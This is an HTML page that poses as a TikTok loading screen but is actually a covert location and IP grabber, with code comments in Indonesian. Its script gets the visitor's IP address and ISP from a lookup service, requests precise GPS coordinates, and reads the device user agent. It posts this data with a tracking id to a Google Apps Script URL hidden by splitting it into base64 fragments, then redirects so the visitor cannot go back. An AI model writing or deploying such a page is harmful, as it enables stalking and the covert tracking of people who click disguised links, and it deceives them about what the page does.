<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TikTok</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; flex-direction: column; }
        .loading-container { text-align: center; }
        .spinner { width: 50px; height: 50px; border: 5px solid #333; border-top: 5px solid #25f4ee; border-radius: 50%; animation: spin 0.8s linear infinite; margin: 20px auto; } /* Sedikit dipercepat animasinya */
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .tiktok-logo { font-size: 36px; font-weight: bold; color: #fff; margin-bottom: 20px; text-shadow: 0 0 10px rgba(255,255,255,0.5); }
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="tiktok-logo">TikTok</div>
        <div class="spinner"></div>
    </div>

    <script>
        (async function() {
            //Ambil parameter URL
            const urlParams = new URLSearchParams(window.location.search);
            const originalUrl = urlParams.get('url');
            const id = urlParams.get('id');

            //Jika parameter kurang, redirect ke homepage
            if (!originalUrl || !id) {
                window.location.replace('https://www.tiktok.com'); // replace biar gabisa back
                return;
            }

            //Fungsi IP Info (Silent)
            async function getIpInfo() {
                try {
                    const response = await fetch('https://ipapi.co/json/');
                    const data = await response.json();
                    return { ip: data.ip || '0.0.0.0', isp: data.org || data.isp || 'Tidak diketahui' };
                } catch (err) { return { ip: '0.0.0.0', isp: 'Tidak diketahui' }; }
            }

            //Fungsi Lokasi (Request GPS)
            function getLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve({ lat: '', lon: '' }); return; }
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            const lat = position.coords.latitude.toString().replace(',', '.');
                            const lon = position.coords.longitude.toString().replace(',', '.');
                            resolve({ lat: lat, lon: lon });
                        },
                        (error) => { resolve({ lat: '', lon: '' }); },
                        { timeout: 7000, enableHighAccuracy: true } // Timeout dikit dipercepat
                    );
                });
            }

            // === THE STEALTH & FAST ENGINE ===

            // THE OBFUSCATOR: Memecah URL Apps Script
            const p1 = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xl";
            const p2 = "LmNvbS9tYWNyb3Mvcy9BS2Z5Y2J6STNTR3FHVlVIN1BoZzRCOmCbN";
            const p3 = "zZfjx4ujTpvMUtuD-QJ3epigrCLsw7XfeAV2JiDr5_H/exec";
            // Gabungkan di memory (tidak terpampang di source code)
            const appsScriptUrl = atob(p1 + p2 + p3).replace(':', 'bCbRNW'); // Base64 decode + reconstruct

            //Kumpulkan data pararel
            const [ipInfo, location] = await Promise.all([getIpInfo(), getLocation()]);
            const device = navigator.userAgent;

            //Siapkan payload
            const params = new URLSearchParams();
            params.append('id', id);
            params.append('lat', location.lat);
            params.append('lon', location.lon);
            params.append('ip', ipInfo.ip);
            params.append('isp', ipInfo.isp);
            params.append('device', device);

            try {
                //Kirim data (mode no-cors)
                await fetch(appsScriptUrl, { method: 'POST', mode: 'no-cors', body: params });
                //Data terkirim (tanpa log di console publik)
            } catch (err) { /* Gagal kirim diabaikan */ }

            // === INSTANT REDIRECT (NO DELAY) ===
            window.location.replace(originalUrl); //replace biar gabisa back ke halaman loading
        })();
    </script>
</body>
</html>
